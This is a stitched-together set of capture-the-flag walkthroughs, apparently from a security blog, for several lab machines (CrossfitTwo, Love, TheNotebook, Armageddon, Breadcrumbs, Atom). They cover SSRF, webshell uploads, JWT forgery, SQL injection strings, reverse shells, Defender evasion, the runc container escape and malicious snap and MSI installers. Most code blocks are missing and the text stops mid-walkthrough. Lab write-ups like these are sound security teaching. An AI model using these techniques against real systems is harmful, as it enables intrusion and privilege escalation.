yubikey is a two factor auth solution that relies on a hardware token that acts like a keyboard. This page lays out the files where the Yubikey key material is stored. I’ll want to find user.uid and user.key in /var/db/yubikey. There might be a user.ctr file as well. Since I can read as root in /var, I can check. I’ll start with the root user, and it works:
The page also talks about making sure “yubikey” is part of the auth-defaults in /etc/login.conf. It isn’t in the default class, but rather the daemon class. The comments for this class say it applies to /etc/rc and root:
Not only does root require yubikey for SSH auth, but it is rejecting su auth all together.
I went through the steps here to generate tokens based on the Yubikey material above (details below), but when I try to connect over SSH, it immediately rejects because I’m not offering an SSH key:
Looking at the SSH config:
The section of the sshd_config man page on the AuthenticationMethod keyword details that the comma separated values must each be completed to authenticate. So in this case, a user needs both the key-based and password-based auth to get in as the root user. Based on the config above, that password will be Yubikey generated. But I still need to find the key.
The man page for changelist describes it nicely:
The /etc/changelist file is a simple text file containing the names of files to be 
backed up and checked for modification by the system security script, security(8).
It is checked daily by the /etc/daily script. See daily(8) for further details.
Each line of the file contains the name of a file, specified by its absolute pathname,
one per line. By default, configuration files in /etc, /root, and /var are added during
system install. Administrators may add additional files at their discretion. Shell
globbing is supported in pathnames.
Backup files are held in the directory /var/backups. A backup of the current version
of a file is kept in this directory, marked “current”. When the file is altered, the old
version is marked as “backup” and the new version becomes “current”.
For example, the system shell database, /etc/shells, is held as
/var/backups/etc_shells.current. When this file is modified, it is renamed to
/var/backups/etc_shells.backup and the new version becomes
/var/backups/etc_shells.current. Thereafter, these files are rotated.
The file on CrossfitTwo has a bunch of stuff in /etc, and then at the bottom, stuff from /root and /var:
The /var/cron/tabs/root file might be interesting, and I can pull it using the filename described above:
There’s the cleanup script for the node_modules step, as well as a restart of unbound even ten minutes. More interesting though is the root SSH key:
There are surprisingly few tools out there to generate a yubikey code from the key/uid/ctr information. Luckily, Yubico has some tools, even if they are a bit under-documented.
Before starting, I’ll need the package asciidoc (apt install asciidoc). Then I’ll run the following commands as documented on the developers page.
After running those, I should be able to run tools including ykparse, ykgenerate, and modhex.
ykgenerate is used to generate a token from a handful of inputs:
I’ve got most of this from CrossfitTwo:
There is only YK_LOW and YK_HIGH remaining. These are timestamps, which, from all the testing I did on CrossfitTwo, don’t matter. I suspect they may in other environments, but I’ll just set them to hex 0s.
I wrote a script to track the variables. It takes an option argument for offset to the counter so that I don’t have to edit the script each time:
It also prints the command that it will run before running it for reference. It generates a token:
ykparse will take that token and the API key and show what it break down to:
The uid matches. 0xf0802 == 985090, which is one more than the counter found on the box.
As I showed earlier, connecting without a key fails. With the key, it prompts for a password:
Pasting in the yubikey output returns a shell:
And I can grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 01 May 2021
OS : Windows
Base Points : Easy [20]
Nmap scan:
Host is up (0.24s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknownCategory: Recon
nmap found many open TCP ports, as is not uncommon for a Windows host:
I can’t glean much about the OS other than that it’s Windows. Probably a good guess that it’s Windows 10. It’s running Apache.
There’s a bunch of ports to enumerate:
I’m not able to get a guest session with SMB:
I’ll have to come back if I find creds.
Connections from my IP are not allowed to MySQL:
I wasn’t able to get anything useful out of 5080 or 7680:
The site just returns a 403 forbidden:
The HTTP headers show the server is hosting PHP:
The TLS certificate shows the domain love.htb and staging.love.htb:
There’s an email address for roy@love.htb. I’ll add both domains to /etc/hosts:
Visiting the page by either name doesn’t change the result.
The server on 5000 returns Forbidden as well:
Both by IP and love.htb, the page returns a login form for a voting system:
The page title is “Voting System using PHP”.
Some basic password guessing didn’t lead anywhere. No matter what I entered, it returned:
There’s the potential that if I can guess an ID, it would give a different error about the password being off, but I couldn’t get it.
The password submissions POST to /login.php, and failed attempts return 302 redirects back to /index.php.
Basic SQL injections didn’t lead anywhere either.
While this looks potentially like an application developed for HTB, it actually isn’t. searchsploit returns three results:
The third one seems like a potential match, but it’s authenticated RCE, so I’ll come back once I have creds.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP. I’ll also use an all-lowercase wordlist since it’s a Windows host:
It returned a bunch of 403 forbiddens, and 301/302 redirects. I am most interested in /admin. Visiting presents another login form:
This form is looking for a username instead of an id. I can enumerate users, as when I enter 0xdf as the user and a bad password, it returns:
When I enter admin:
Clearly admin is a valid username. If I can’t find anything else, I can come back and check for more.
The staging.love.htb website is different. It’s a file scanning application:
In the nav bar at the top, Home leads to this page, but Demo goes to /beta.php, where there’s a form that takes a url:
If I start a Python webserver and enter a url hosted on my IP, it does make a request to my server:
The resulting page is contains the result:

Category: Shell as phoebe
Getting the server to make a request and potentially access something I can’t access otherwise is known as a server-side request forgery (SSRF) exploit. While typically they are a bit more well disguised than a site that asks for for the url, using this to access things I shouldn’t have access to is SSRF all the same.
I tried entering https://127.0.0.1, but nothing returned. However, when I checked the service on 5000 by entering http://127.0.0.1:5000:
It seems to be giving creds for the Voting System, and they work.
Having identified an authenticated RCE exploit in Voting System earlier in searchsploit, and now creds, ‘ll give that a try. searchsploit -m php/webapps/49445.py will copy it to my current working directory. It’s a Python script. At the top there’s some config info to update:
I ran the exploit, and nothing happened:
Looking at the Python script, it is using requests to send HTTP requests to the website. At the start, it creates a session, which will hold things like cookies to enable things like logging in. It stores it in the global variable s. I’ll add Burp as a proxy to that session so that I can see the requests it is sending and potentially see what’s wrong:
On running the script again, I see three requests, all of which are returning 404:
It’s not finding any of those pages. Above, I found the admin login page at /admin/login.php, but for some reason this script is adding /votingsystem before that. Right under where I configured the settings, there’s a handful of URLs defined:
I’ll remove /votingsystem from each and save the script.
With nc still listening on TCP 443 (with rlwrap to make the Windows shell better), I’ll run the updated script:
It hangs there, but then there’s a connection to nc with a shell:
And I can grab the first flag from the user’s desktop:
Once logged in, there’s not a ton to see:
Clicking around the panels didn’t lead to anything interesting. However, clicking on the logged in user’s name, Neovic Devierte, there’s an option to update:
Clicking that brings up a form to update the admin profile:
The profile picture is the first target that comes to mind, as it’s the chance to upload something. It looks like zero filtering is in place, as if I just select a simple PHP webshell and upload it as cmd.php, it doesn’t complain.
The image is now broken at the top:
Looking at the source for the page, it saved the file as cmd.php:
Visiting http://love.htb/images/cmd.php returns an error about missing cmd:
Adding ?cmd=whoami to the end shows I have execution:
To get a shell from here, I could use a PHP reverse shell, or upload nc.exe or a Nishang PowerShell shell.

Category: Shell as SYSTEM
After looking around the filesystem a bit manually, I opted to run WinPEAS. After cloning the repo to my VM, I went into the directory with winPEAS.exe and started a Python web server (python3 -m http.server 80).
From Love, I’ll use PowerShell to upload the file:
There’s a hit on the webserver, and the file is present. Now I’ll run it with .\wp.exe. There’s a ton of output, so I’ll just highlight the interesting parts.
It finds a PowerShell history file:
Being able to create directories at the C:\ root is interesting.
That’s not exploitable on it’s own, but enables others.
AlwaysInstallElevated is set to 1:
This is bad, and is almost certainly exploitable.
There are some unquoted service paths with spaces in them. If I can restart those services, I could potentially hijack them.
These registry keys tell windows that a user of any privilege can install .msi files are NT AUTHORITY\SYSTEM. So all I need to do is create a malicious .msi file, and run it.
I’ll use msfvenon to create the MSI installer. I did show this process manually for Ethereal, but it’s a painful process, and msfvenom will work here. I’ll use a reverse shell payload that I can catch with nc:
I’ll upload it just like I did with WinPEAS:
This requests the file from my Python webserver (now running out of my love directory) and fetches the MSI.
Now I just need to run it with msiexec:
This returns nothing, but there’s a shell at my listening nc:
I can grab the root flag from the administrator’s desktop:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 06 Mar 2021
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65504 closed ports, 29 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 18.04 Bionic.
The site is a note taking application:
The Log In link leads to /login, and presents a form:
The login form will allow me to enumerate users. When I try admin/admin:
When I try 0xdf/0xdf:
Still wasn’t able to do much with that at this point.
The register link (/register) gives another form:
On submitting, it returns a logged in page:
The Notes link goes to /f101e435-1f44-42cd-a7cc-28a99da1df24/notes. I’m guessing that guid is associated with my account. I don’t have any notes:
I can add one using the link and the form it brings up:
I’ll run feroxbuster against the site:
The only thing new is /admin, and visiting just returns Forbidden:
The HTTP headers don’t give much, only NGINX:
Based on all the HTTP endpoints having no extension, I can guess that this is a Python or Ruby framework, but it’s really hard to say for sure.
After a POST to /register, there are two Set-Cookie headers in the response:
The UUID matches the path I was given to my notes. The number of possible UUIDs like this is big enough that if they are randomly generated, I won’t be able to brute force someone else’s path.
The auth cookie looks like a JWT. I’ll throw it into jwt.io:
The data gives my username and email, as well as what I can guess is a flag that says if the user is an administrator, admin_cap. The header part shows it’s using asymmetric key pairs for signing, and gives a URL for the kid. In this case, it’s hitting localhost port 7070 to get the private key.

Category: Shell as www-data
Because I can change the header information in the JWT, I’ll try giving it a kid of my host instead of the local box. A secure server would reject anything that isn’t on localhost (or some other specifically whitelisted host), but forgetting that is not an uncommon mistake.
I’m going to generate my own key to host, and then generate a JWT that points to that key, so it will then validate.
I’ll generate a key using openssl:
Now I’ll host that key using a Python webserver (python3 -m http.server 80).
I’ll generate a JWT token that uses my private key:
I’ve updated the kid to point to my server. I’ve changed admin_cap to 1, and I’ve signed it with my private key.
I’ll go into Firefox dev tools in the Storage section and replace the current auth key with this one, and refresh at /admin. There’s a request for priv.key at my Python webserver, and the page shows it’s no longer forbidden:
In fact, the link to the Admin Panel has been added at the nav bar.
Interestingly, in the Notes link, it still shows the single note associated with my UUID. But the link in Admin Panel –> View Notes goes to /admin/viewnotes, where I see all the notes on the server:
There are two hints in the notes from the admin:
The more interesting link is the Upload File link, which leads to a form:
I first tried to upload a plain text file, test.txt:
It changes the filename, but not the extension. However, the View link is broken, as it returns 404. That’s really odd.
Because the note said that PHP files were being executed, I’ll upload a simple PHP webshell:
It shows up with a long hex filename, but with the same extension:
With .php, the View link does work, and if i add ?cmd=id to the end, it show I have execution:
I’ll look at what’s going on with the webserver in Beyond Root.
I like to use curl to trigger web shells and that works too:
To get a shell from that, I’ll start nc listening and replace id with a reverse shell payload:
curl just hangs, but at nc there’s a shell:
I’ll upgrade my shell using the script / stty trick (python and pty work as well):

Category: Shell as noah
I’m dropped into ~/html (which is /var/www/html), but the only file there is my webshell:
This is really weird, and I’ll dig into it in Beyond Root.
ifconfig does show that I’m on the host machine (10.10.10.230), but also that there’s a Docker network:
There’s only one home directory, noah:
user.txt is there, but I can’t read it as www-data.
Given the note about backups, I’ll checkout /var/backups:
These are all owned by root, but world readable. I’m not so much interested in the apt-related ones, but home.tar.gz could be interesting. I’ll list the files inside:
It looks to be noah’s home directory, and there’s a private key in .ssh. I’ll read the key from the archive (without extracting it to disk first to not make a mess):
The key works to SSH as noah:
And I can grab the user.txt:

Category: Shell as root
noah can run sudo to run docker as root to start a specific set of containers:
When looking at this, the important thing to look at is the version of Docker running:
There’s a vulnerability in the version of runc used by Docker before 18.09.2 (CVE-2019-5736) which allows at attacker to overwrite the host runc binary from access as root inside a container, and thus gives host root access. This post from Unit42 does a really good job of breaking it down in detail.
The idea is that from within the container, I’ll overwrite /bin/sh with #!/proc/self/exe, which is a symbolic link to the binary that started the container process. Next, I’ll write to the runc binary (which is shared on the host), and have it point to the payload.
Now, when someone tries to initiate a container (ie, runs docker exec from the host), the payload will execute on the host as root.
There are tons of POCs out there, but I really like this one. It’s a simple Go script, which I’ll save on my system. At line 15-16, there’s the payload that will be executed:
I’ll change that to write my SSH key to /root/.ssh/authorized_keys:
I’ll build the ELF with go build cve-2019-5673.go, and now there’s an executable:
I’ll want two shells on TheNotebook as noah, which is easy with SSH. In the first, I’ll drop into the container and upload the binary:
I’ll make it executable, and run it:
It hangs after reporting that /bin/sh was successfully overwritten. It’s waiting for someone to try to run runc. In the second window, I’ll run docker exec again:
It returns a weird error, but as soon as I run it, more prints in the first window:
My SSH key was just written to root’s authorized_keys file, and I can connect over SSH:
And grab root.txt:
When I landed on the host, I found the PHP backdoor I uploaded, but nothing else of the website, and wanted to see how it worked. It’s a really interesting exercise, and I’d encourage you to take a minute and map it out before reading my solution. I’ve learned a ton with these kinds of config explorations.
I know from the HTTP response headers that the service listening on TCP 80 is claiming to be NGINX, so I’ll check out the config in /etc/nginx/sites-enabled/:
There’s a single site, default, with the following config:
The webserver root is /var/www/html, which is the typical default. There are two directives. The first, location ~ \.php$ will match on anything ending with .php, and send it to be handled by PHP. Given the web root, this will execute files in /var/www/html ending with .php.
The second directive is location /. It will match on everything else, and proxy it to localhost port 8080.
Looking at netstat, TCP 8080 is listening by docker-proxy:
As root, I can list the running containers:
The second one, webapp, shows that it’s listening on localhost 8080 and forwarding it to 8080 inside the container. The first one is also listening on 8080, but without the forward from the host.
The remaining question is how does my PHP upload end up on the host and not in the container?
docker inspect webapp will print the entire config for the running container. It’s too much to include here in full, but some highlights.
The contain is running a simple HTTP server listening on 7070 and then using gunicorn to run main:app listening on port 8080:
I’ll remember that 7070 is the service hosting the private key for JWT verification. I suspect the privKey.key is in that directory.
There’s a bind, which is a folder from the host that’s mapped into the container:
That’s a good clue. If the webapp is saving files to /opt/webapp/admin/files/ in the container, that’s /var/www/html outside it. This is kind of a strange setup, but Docker leads to odd things.
I’ll drop into the container and check it out:
The current directory is /opt/webapp.
main.py is the guts of the Flask application. It create the flask application and config:
Then it defines the different routes of the webapp. For example, /admin/upload:
It is reading and writing files to the path defined as app.config['UPLOAD_FOLDER'], which I noticed above is ./admin/files.
Putting that all together, the picture looks like:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 27 Mar 2021
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the Apache version, the host is likely running CentOS 7. The HTTP is hosting a Drupal 7 instance, and there’s a robots.txt file with a bunch of paths that I may want to check out in more detail.
The site doesn’t have much content on it:
In the page source, the Drupal version is clear:
The robots.txt file looks exactly the same as the one on Drupal’s GitHub, so nothing interesting there. I did change the branch on GitHub to 7.X to get the code the was closest to the version on Armageddon to see that match.
I can try to create an account, but the process involves getting an email, which is typically not an option on HTB. I could try seeing if it will send to my IP, but the site throws errors that suggests it can’t send:
In the Drupal GitHub, there’s a file at the root, CHANGELOG.txt. That file exists on Armageddon as well:
This gives the exact version, 7.56.
serachsploit shows a bunch of Drupal exploits (snipped out ones for non-7 versions):
There’s clearly a lot here. Drupalgeddon 2 and 3 both look like candidates.

Category: Shell as apache
Given the number of exploits and the fact that the quality in searchsploit can be a bit all over the map, I went to Google, and found this repo. I’ll look at exactly what it’s doing in Beyond Root, but the repo itself works great. Running it provides a prompt:
The prompt works like a shell:
The last line before the prompt suggests it just has a webshell running. It works too:
To get a shell, I triggered the same webshell with a Bash reverse shell:
curl hangs, but at my listening nc:
I tried to do the shell upgrade, but it complains about being out of PTY devices:
I wasn’t able to find a way around that. I didn’t really need a PTY shell, but if I did, I would have tried uploading socat next.

Category: Shell as brucetherealadmin
Typically I go look at /home to see what other users are on the box and where I might want to pivot next. Interestingly, I can’t see anything in /home:
Looking at /etc/passwd, there’s one other account of interest, brucetherealadmin:
apache doesn’t have access to much, so back into the web directory. There’s a settings.php file in /var/www/html/sites/default. It’s got DB creds:
Everything else looks default.
Because my shell is a not in a PTY, I’ll have to run DB commands from the command line. Drupal creates a bunch of tables:
I’m immediately interested in users.
There’s a hash for brucetherealadmin.
That hash matches the format for Drupal 7 on the example hashes page. Hashcat will crack it pretty quickly with hashcat -m 7900 brucetherealadmin-hash /usr/share/wordlists/rockyou.txt to find the password “booboo”.
This password works for SSH access:
And I can grab user.txt:

Category: Shell as root
brucetherealadmin can run snap installs as root:
Googling for maliocus snap packages led me to an article from 2019 about Dirty Sock. This isn’t the vulnerability here, but they used a malicious snap package to exploit the Dirty Sock exploit, and I remember playing with Dirty Sock on HTB and writing this post about it.
There’s a section in the Dirty Sock post that walks through how to create a snap package:
I worked from an Ubuntu VM to make the snap, and just followed the instructions. Installed the tools:
Now I’ll find a directory to work out of, and run snapcraft init. It creates a snap directory with snapcraft.yaml in it:
I’ll prep the install hook:
The next step in the example they save to install a Bash script that creates a user and adds it to the sudoers group. I’ll have mine just write a public SSH key into the root authorized_keys file:
The next file, snapcraft.yaml, is just boilerplate. I’ll just use the example:
Now on running snapcraft, it creates the package:
I’ll start a Python HTTP server in the directory on my local box where the snap package is:
Now from Armageddon, I’ll request it. wget isn’t installed, but curl is:
To install the package, I’ll run the command with sudo and pass it the snap. It fails:
Some Googling this error suggested adding --dangerous, which now gives a different error:
Googling that leads to posts about --devmode, which works:
If that install worked as I hope, my public key is now in /root/.ssh/authorized_keys, and I should be able to connect with SSH. It worked:
And I can get the root flag:
To take a look at that Ruby script, I set a new listener in Burp that would listen on port 8888 and forward all traffic to 10.10.10.233 port 80:
Then I ran the exploit targeting http://127.0.0.1:8888:
There are eight new requests in Burp:
The first thing it does is pull the CHANGELOG.txt, just like I did above. Then it tries a couple paths to this /user/password form, and gets 500 and 404. It goes back to the one that gave 500, and adds additional parameters:
The name[%23markup] field is set to a command. I’m not going to dive too much deeper into the details of why this executes - This post from Checkpoint does a really nice job going into the details. But to see what the script does, it first sends the request above with the final bit being echo VQMJGJAU. This is just to verify that the exploit works. Then it tries to talk to the backdoor (presumably to see if it’s already uploaded). When that fails (404), it sends the next request:
This time the command is:
The base64 string is pipped into base64 to decode it and then tee will output it to the paste and write it to shell.php.
The command decodes to a PHP webshell:
Now there’s a request to shell.php which is successful (running the hostname command to set up the prompt), and now it’s left to the user to issue additional commands.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 20 Feb 2021
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.013s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknownCategory: Recon
nmap found many open TCP ports:
Big take-aways from nmap:
I’m not able to get a null session on SMB with either smbmap or smbclient:
As far as I could tell, the sites on 80 and 443 were the same, just HTTP vs HTTPS.
The site is for a library:
The menu has a link back to this page, index.php. The “Check books.” link leads to /php/books.php:
Searching in here returns books that have the input in the title (it looks like it appends wildcards on either side). Searching for an in the title returns:
Clicking the “Book” button loads an overlay with more details:
Each time the user does a search, the site sends the following HTTP request:
And when details are requested:
Any time a filename is listed as a parameter, it’s worth looking for file include and for directory traversal and/or file include vulns. Sending this request to Burp Repeater, if I change it to book=., it returns an error:
This leaks lots of good info. The page is prepending ../books/ to what I submit, and the source for the page is running out of C:\xampp\htdocs\includes\bookController.php. It’s loading the content with file_get_contents, so it will just display the contents of the file, and not execute it as PHP, which means I can leak source, but not use this for code execution.
Updating the request to book=..\includes\bookController.php, I get the source for this page (some whitespace edited):
I’ll dig into this more later, but it’s clear I can read files that I shouldn’t be able to read. It’s also clear these files are not being included (executed as PHP code).
I’ll run gobuster against the site, and include -x php since I know the site is PHP:
/portal is interesting for sure. /db has directory listing on (though db.php returns an empty page):
This path redirects to /portal/login.php, which presents a login form:
The “helper” link leads to /portal/php/admins.php:
I couldn’t log in as any of these users (though I’ll keep a list for later). The Sign up link on the login page does work to provide some access:
“Check tasks” leads to /portal/pip/issues.php:
Clicking on the “Nuke it” bottoms just pops saying that I’m awaiting approval. There is a hint here that the book information is not stored in a database, which suggests perhaps file storage.
“Order pizza” pops up a message box:
“User management” (/portal/php/users.php) gives the same list of users, now with roles (and the user I created is on there):
“File management” just blinks and stays in the same place. Looking in Burp, it’s requesting /portal/php/files.php, but getting back a 302 redirect to ../index.php. However, that 302 has a full page in it, and if I catch the response in Burp, and change 302 Found to 200 OK, the page loads:
Even still, if I try to submit something, it fails:

Category: Shell as www-data
The file_get_contents vulnerability returns a poorly formatted string:
Because I need to pull lots of source, I write a quick Python script:
I can run that to get source for a page:
There’s a hint about PHPSESSID cookies never expiring. I’ll get the source for /portal/login.php:
It’s mostly a static page, but loads authController.php, which is where the logic to handle the login POST request lives:
The source looks ok. The code handles checking the DB for username and password hash matches. There’s no SQL injections, as it’s using PHP prepared statements:
If the first DB query returns users, and the second returns a user with the same username and password, $valid is set to true which leads to the script creating two cookies.
There’s two other interesting files it imports with require, cookie.php and db/db.php. db.php has creds, which I’ll note:
The code in authController.php calls the function makesession to create the PHPSESSID cookie value:
session_id sets the current session to the input. The makesession function isn’t defined in this source, but in cookies.php:
The session cookie is calculated by pullone one character at random from the username and adding some static characters and taking a hash. This means the number of possible cookies for a given user is the length of their username.
The PHPSESSID cookie is directly related to the username, and from above, I know it doesn’t expire.
I can write a Python script that will check each possible cookie for each user by calculating each possible cookie for each user and checking it at the /portal site:
It finds three valid cookies:
As Paul is the admin according to the users page, so that’s a good target to start with. I’ll replace my cookie in Firefox dev tools with his and on refresh, I’m logged in as Paul.
As Paul, clicking on “File management” takes me to /portal/php/files.php (no longer getting the redirect away from it), but I still get the message about “Insufficient privileges” on trying to upload.
The other cookie submitted with each request is named token, and it’s a JWT:
Dropping it into JWT.io, the only data is the username, and it’s my username:
The signature shows invalid because I’ve left the secret blank. This cookie is also generated in authController.php:
With access to the key, I can add that to the site and now it says signature verified:
That also means I can change it. I’ll change the username to paul, and copy the new JWT into Firefox.
Now when I upload a file, it just says “Success”.
I’ll upload my standard mini PHP webshell:
It spits out warnings:
There’s two issues here:
For the first issue, looking at the POST request, it becomes clear that this won’t be hard to fix:
The webpage is appending .zip to the given task name client side and sending that. I’ll send this request to repeater, and first change shell.zip to shell.php. The error message still comes, but now the second error shows it’s now trying to move to the right place:
The second issue is something I’ve run into before in Buff. Windows Defender is flagging and deleting this file as malware, and then when PHP goes to move it, the file is no longer there. I’ll change the webshell to use shell_exec instead of system:
Now I’ll upload the modified webshell to get around defender (and modify the filename to .php in Burp Proxy), and the site responds “Success. Have a great weekend!”.
Visiting http://10.10.10.228/portal/uploads/shell.php?cmd=whoami shows I have execution:
Because these cookies won’t change, I can automate this upload in a curl command:
I’ll grab Invoke-PowerShellTcpOneLine.ps1 from Nishang and update it with my IP address, and then base64-encode it so that PowerShell can run it:
I tried passing this to the webshell, but no shell came back and nothing returned:
Given that I’ve already experienced Defender catching things on this host, it seems very likely that this Nishang shell is getting blocked as well.
I’ll start a Python webserver hosting nc64.exe, and then get it using PowerShell wget:
Now connect back with a shell:
At my listening nc (with rlwrap to get up-arrow history and better terminal on Windows):

Category: Shell as juliette
As the www-data user, I’ll check out the web files, and there’s a path I hadn’t found, pizzaDeliveryUserData:
This sounds like it might be related to the “Order pizza” button that was disabled on the /portal page.
In the directory, each user has a file, though all but one are .disabled:
The disabled file are JSON, but everything is null:
For juliette, there are values:
Since this Windows host has SSH, I’ll give it a try, and it works:
I’ll run powershell to get a better shell (including tab completion), and then grab user.txt:

Category: Shell as administrator
In the root of C:\ there are two non-standard folders, Anouncements and Development. The first contains a single file with some announcements:
juliette doesn’t have access to Development.
On juliette’s desktop, there’s a todo.html (because julliette is the kind of person who makes lists in HTML tables complete with CSS):
I’m already in on port 22. Time to look at Sticky Notes and the password manager.
Some Googling reveals that the Sticky Notes data is stored at %LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite, and it’s there on Breadcrumbs:
The -wal file is the Write-Ahead Log (WAL) file. This is used to implement atomic commit and rollback. The -shm file is the Shared-Memory file for the DB, providing memory for multiple processes accessing the database. The three files together are critical for getting the data out. If I just take the .sqlite file, it will appear empty.
Interestingly, if I take all three to my machine, open the DB, make any kind of query, and then exit, because now no processes have handles to the DB, it will save it all into a single .sqlite file.
I’ll start a local SMB server on my box with smbserver.py share . -smb2support, and then copy the files to the new share:
Now I have a local copy:
I’ll open the DB with sqlite3 plum.sqlite. It has a handful of tables:
Only the Note table has anything interesting in it. It has a bunch of columns:
It’s the Text I care about, and it contains passwords:
I already had the password for juliette, though it’s good to see this one matches. development is new. And (of course) administrator isn’t there any more.
juliette has access to the Anouncements share, but not the Development share:
development has read access to Development:
The share has a single file, so I’ll grab a copy:
The binary is a x64 ELF that’s not stripped:
Running the binary gives some updates on it:
Trying with a key fails:
The main function is clearly identified in Ghidra, and matches the output above:
After printing the message, it checks to ensure the length of the args is two (which means one command line arg, as it counts the name of the binary), and if not, it prints the usage.
Then it does a loop over the key input, adding the bytes together, and if the sum isn’t 0x641, it returns “Incorrect master key” (this is bad crypto, hardcoding in this check for the key). I don’t end up needing this, as the program just creates a web request, so I’ll just drop to curl. But I’ll look at it in Beyond Root.
Then is builds a curl command:
Even without knowing the constant values being set here, I can surmise it’s doing a curl to http://passmanager.htb:1234/index.php.
TCP 1234 is listening on Breadcrumbs, just on localhost:
I’ll kill the SSH session and reconnect with -L 1234:127.0.01:1234, set passmanager.htb to 127.0.0.1 in /etc/hosts, and then used curl:
One important note that caused me lots of pain - Windows resolves localhost to ::1 (IPv6), which won’t always work well if IPv6 isn’t configured to accept the connection. In this case, the webserver isn’t listening on v6, so -L 1234:127.0.0.1:1234 works where -L 1234:localhost:1234 does not.
Before I completely figured that out, I turned to Chisel, uploading it, starting the server locally, and then connecting back to it:
At the server:
Now when I try curl it works, returning an AES key:
Finally, a third way to access the service is using curl.exe on Breadcrumbs without any forwarding:
The parameters in this request look very much like they are being fed into an SQL query. When an application is making the request instead of a browser, developers often are more careless with the input, so this is a good place to check for SQL injection. Looks promising:
I can guess that the query looks something like:
I’ll set {username} to ' or true;-- - to make:
It works, though still only the one key:
I’ll set {username} to ' UNION SELECT 1;-- - to make:
It works:
Now I can use this to get data. List DBs to see there are only two:
The bread database only has one table, passwords:
That table has four columns:
Get all the data:
With an AES key and a password field that looks base64-encoded, I’ll turn to Cyberchef:
I had to guess an IV of all 0s, but the rest was pretty straight forward.
crackmapexec confirms that password works for SSH as administrator:
Now it’s just logging in and getting the flag:
The Kryptor_Linux program starts with this check (decompliation by Ghidra):
I mentioned above that this was really bad crypto. There’s a lot to critique here. Each loop, it re-calculate the strlen of the input before checking if i was past the end of the string. Then it gets this value:
*(long *)(argv + 8) is the address in memory of the input string. So it’s going i bytes into that string, and then casting it as a char. This cast makes sure to only grab one byte (eight bits). That result is added to res.
In a Python terminal, that’s the same as:
So any key that totals to 0x641 will return the key. I can play with test strings to find lots that total 0x641:
And that works:
These work as well:
In summary, the binary was not needed once I found the curl request. Still, worth showing how easily this kind of gate is to bypass.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 17 Apr 2021
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.70s latency).
Not shown: 65528 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
7680/tcp open  pando-pubCategory: Recon
nmap found seven open TCP ports, HTTP (80), HTTPS (443), RPC (135), SMB (445), WinRM (5985), Redis (6379), and something on 7680:
SMB reports that the OS is Windows 10 Pro, and the hostname is Atom. Apache on Windows suggests XAMPP, but could be something else. The TLS script doesn’t give any virtual host names. Looking at the certificate in Firefox doesn’t give any additional information.
I can connect to Redis with nc or redis-cli. Either way, it rejects me for lack of auth:
I’ll come back later if I can get creds.
smbmap with no username/password just returns an auth error, but when I give it a user that doesn’t exist, it gets a guest session and shows four shares:
smbclient can also list the shares:
crackmapexec behaves similarly to smbmap:
The only non-standard share is Software_Updates, and a guest session has read and write privileges.
This share has a PDF, and three directories:
The directories are all empty. I’ll grab the PDF:
The document is an internal document describing the testing procedures for Heed:
The documentation admits that the application doesn’t do much yet. The quality assurance (QA) section does provide some hints as to places to look for vulnerabilities:
We follow the below process before releasing our products.
It looks like updates to the software are tested by putting them into one of the client folders from the SMB share.
Both HTTP and HTTPS seem to return the same site, which is for a software company, Heed Solutions:
The page has links to download Heed, the note taking application mentioned in the QA documentation. There’s only a Windows version right now, as Mac and Linux both say “Coming soon”. I’ll grab a copy of the Windows version, which downloads as heed_setup_v1.0.0.zip.
I’ll run ferobuster against the site, and include -x php based on my guess that it could be running XAMPP, but it doesn’t find anything useful.
I’ll download the Windows package and take a look. From analysis of this binary, I need to get a couple of key pieces of information. I’ll show how to do that from both from Linux and from Windows.
The zip file contains a single exe:
The EXE is a Nullsoft Installer self-extracting archive:
Within my Parrot VM, double clicking the EXE will open it in the archive manager:
There’s an uninstall executable, and a $PLUGINSDIR. Inside the directory, there are several linked libraries (.dll files) and a app-64.7z:
I recognize this format from the 2020 Holiday Hack as an Electron application, but some Goolging could get you there as well. I’ll decompress the app-64.7z. There’s a bunch of stuff in here, most of which I can ignore:
Electron applications bring along everything they need to run a JavaScript/HTML-based application, so things that start with chrome and v8 are just that. In resources, there’s an app.asar file, which is what contains the JavaScript and HTML templates for the application.
I’ll install ASAR tool with npm -g install asar, and then run it to list the files:
The ef command will extract a file from the .asar, in this case, main.js:
Looking at the require statements at the top, it is bringing in a couple packages:
